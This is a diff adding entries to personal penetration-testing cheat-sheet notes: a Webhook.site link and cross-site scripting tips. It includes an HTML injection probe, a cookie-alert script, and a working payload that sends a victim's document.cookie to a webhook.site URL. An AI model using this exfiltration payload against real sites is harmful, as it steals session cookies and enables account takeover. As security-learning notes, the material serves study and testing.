@@ -533,6 +533,10 @@ Look [[Notes_ETH#Kerberoasting|here]] to deply understand
 curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems
 [GTFOBins](https://gtfobins.github.io/)
 
+### Webhook.site
+it gives you an unique website URL -->  that you can make calls to
+[Webhook](https.//webhook.site)
+
 ----
 ## Browser Extensions
 #### FoxyProxy 
@@ -669,6 +673,11 @@ Cross Site Scripting (XSS) -->  let us execute JavaScript in a victim browser
 	- `print()`
 	- `prompt('hello')`
 
+when you are testing for XSS:
+you can first check for -->  HTML injection
+=>
+- `<h1> test </h1>`
+
 #### Basic XSS
 `<img src=x onerror="prompt(1)">`
 document tries to load x =>    - it will throw an error
@@ -676,5 +685,18 @@ document tries to load x =>    - it will throw an error
 if it works =>
 try to redirect the user:
  `<img src=x onerror="window.location.href='https://google.com'">`
+
+##### Get cookie
+`<script> alert(document.cookie)</script>`
+
+##### Exfiltrate Cookies
+- open [[cheet#Webhook.site|WebHook website]]
+- copy the unique URL
+- at the end of it -->  `/?`
+- type in the vulnerable input
+  `<script> var i = new Image; i.src="https://webhook.site/a67abe7f-f8f9-44af-bf90-6f29be6fd833/?"+document.cookie; </script>`
+- refresh the vuln page
+- <span style="color:#00b050">we got the cookie</span> 
+  ![[Pasted image 20240308113410.png]]
 
 
